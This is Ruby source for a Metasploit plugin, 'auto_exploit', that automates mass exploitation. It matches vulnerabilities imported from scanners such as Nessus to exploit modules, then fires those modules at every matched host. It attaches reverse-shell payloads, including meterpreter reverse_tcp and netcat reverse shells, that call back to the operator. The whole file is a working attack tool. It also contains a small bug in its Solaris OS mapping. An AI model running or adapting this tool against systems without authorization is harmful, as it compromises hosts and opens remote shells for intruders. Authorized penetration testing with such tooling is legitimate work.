# Copyright (c) 2012, Carlos Perez <carlos_perez[at]darkoperator.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
module Msf

	class Plugin::AutoExploit < Msf::Plugin

		class AutoExploit
			include Msf::Ui::Console::CommandDispatcher

			# Set name for command dispatcher
			def name
				"auto_exploit"
			end

			# Define Commands
			def commands
				{
					"vuln_exploit" => "Runs exploits based on data imported from vuln scanners."
				}
			end

			# Multi shell command
			def cmd_vuln_exploit(*args)
				require 'timeout'

				# Define options
				opts = Rex::Parser::Arguments.new(
					"-f"   => [ true,	"Provide a comma separated list of IP's and Ranges to skip when running exploits."],
					"-r"   => [ true,   "Minimun Rank for exploits (low, average,normal,good,great and excelent) good is the default."],
					"-s"   => [ false,	"Do not limit number of sessions to one per target."],
					"-h"   => [ false,  "Command Help"]
				)

				# set variables for options
				os_type = ""
				filter = []
				range = []
				limit_sessions = true
				matched_exploits = []
				min_rank = 100
				ranks ={
					"low" => 100,
					"average" => 200,
					"normal" => 300 ,
					"good"=>400,
					"great"=>500,
					"excelent" => 600
				}
				# Parse options
				opts.parse(args) do |opt, idx, val|
					case opt
					when "-f"
						range = val.gsub(" ","").split(",")

					when "-r"
						if ranks.include?(val)
							min_rank = ranks[val]
						else
							print_error("Value of #{val} not in list using default of good.")
						end

					when "-s"
						limit_sessions = false
						
					when "-h"
						print_line(opts.usage)
						return
					end
				end

				# generate a list of IP's to not exploit
				range.each do |r|
					Rex::Socket::RangeWalker.new(r).each do |i|
						filter << i
					end
				end

				print_status("Matching Exploits (This will take a while depending on number of hosts)...")
				framework.db.workspace.hosts.each do |h|
					# Check that host has vulnerabilities associated in the DB
					if h.vulns.length > 0
						os_type = normalise_os(h.os_name)
						#payload = chose_pay(h.os_name)
						framework.exploits.each_module do |x,e|
							found = false
							x = e.new
							# lets filter for those exploits that are actually remote and match the OS
							if x.fullname =~ /#{os_type}/ and x.datastore.include?('RPORT')
								next if not x.rank >= min_rank
								# lets get the proper references
								e_refs = parse_references(x.references)
								h.vulns.each do |v|
									v.refs.each do |f|
										if e_refs.include?(f.name) and not found

											# Skip those hosts that are filtered
											next if filter.include?(h.address)

											# Save exploits in manner easy to retreave later
											exploit = {
												:exploit => x.fullname,
												:port => v.service.port,
												:target => h.address
											}
											matched_exploits << exploit
											found = true
										end
									end
								end
							end
						end
					end
				end

				if matched_exploits.length > 0
					print_good("Matched Exploits:")
					matched_exploits.each do |e|
						print_good("\t#{e[:target]} #{e[:exploit]} #{e[:port]}")
					end
				else
					print_error("No Exploits where Matched.")
					return
				end
				port_list = (1024..65000).to_a.shuffle.first
				print_status("Running Exploits:")
				matched_exploits.each do |e|
					if limit_sessions and get_current_sessions.include?(e[:target])
						print_good("\tSkipping #{e[:target]} #{e[:exploit]} because a session already exists.")
						next
					end
					begin
						ex = framework.modules.create(e[:exploit])
						ex = chose_pay(ex, e[:target])
						ex.datastore['RHOST'] = e[:target]
						ex.datastore['RPORT'] = e[:port].to_i
						ex.datastore['LPORT'] = port_list
						ex.datastore['VERBOSE'] = true
						(ex.options.validate(ex.datastore))
						print_status("Running #{e[:exploit]} against #{e[:target]}")
						Timeout::timeout(20) do
							ex.exploit_simple(
								'Payload'	   => ex.datastore['PAYLOAD'],
								'LocalInput'	=> driver.input,
								'LocalOutput'   => driver.output,
								'RunAsJob'	  => true
							)
						end
					rescue Timeout::Error
						print_error("Exploit #{e[:exploit]} against #{e[:target]} timed out")
					end
				end
				
			end

			# Normalize the OS name since different scanner may have entered different values.
			def normalise_os(os_name)
				case os_name
				when /(Microsoft|Windows)/i
					os = "windows"
				when /(Linux|Ubuntu|CentOS|RedHat)/i
					os = "linux"
				when /aix/i
					os = "aix"
				when /(freebsd)/i
					os = "freebsd"
				when /(hpux|hp-ux)/i
					os = "hpux"
				when /solaris/i
					os = solaris
				when /(Apple|OSX|OS X)/i
					os = "osx"
				end
				return os
			end

			# Parse the exploit references and get a list of CVE, BID and OSVDB values that
			# we can match accurately.
			def parse_references(refs)
				references = []
				refs.each do |r|
					# We do not want references that are URLs
					next if r.ctx_id == "URL"
					# Format the reference as it is saved by Nessus
					references << "#{r.ctx_id}-#{r.ctx_val}"
				end
				return references
			end

			# Choose the proper payload
			def chose_pay(mod, rhost)
				# taken from the exploit ui mixin
				# A list of preferred payloads in the best-first order
				pref = [
					'windows/meterpreter/reverse_tcp',
					'java/meterpreter/reverse_tcp',
					'php/meterpreter/reverse_tcp',
					'php/meterpreter_reverse_tcp',
					'cmd/unix/interact',
					'cmd/unix/reverse',
					'cmd/unix/reverse_perl',
					'cmd/unix/reverse_netcat',
					'windows/meterpreter/reverse_nonx_tcp',
					'windows/meterpreter/reverse_ord_tcp',
					'windows/shell/reverse_tcp',
					'generic/shell_reverse_tcp'
				]
				pset = mod.compatible_payloads.map{|x| x[0] }
				pref.each do |n|
					if(pset.include?(n))
						mod.datastore['PAYLOAD'] = n
						mod.datastore['LHOST']   = Rex::Socket.source_address(rhost)
						return mod
					end
				end
			end
			# Create a payload given a name, lhost and lport, additional options
			def create_payload(name, lhost, lport, opts = "")
				puts name
				pay = framework.payloads.create(name)
				pay.datastore['LHOST'] = lhost
				pay.datastore['LPORT'] = lport
				if not opts.empty?
					opts.split(",").each do |o|
						opt,val = o.split("=", 2)
						pay.datastore[opt] = val
					end
				end
				# Validate the options for the module
				if pay.options.validate(pay.datastore)
					print_good("Payload option validation passed")	
				end
				return pay

			end

			def get_current_sessions()
				session_hosts = framework.sessions.map { |s,r| r.tunnel_peer.split(":")[0] }
				return session_hosts
			end

		end


		def initialize(framework, opts)
			super
			add_console_dispatcher(AutoExploit)
			print_status("auto_exploit plugin loaded.")
		end

		def cleanup
			remove_console_dispatcher("auto_exploit")
		end

		def name
			"auto_exploit"
		end

		def desc
			"Allows for automation of running exploit modules based on information in the Database."
		end

		protected
	end
end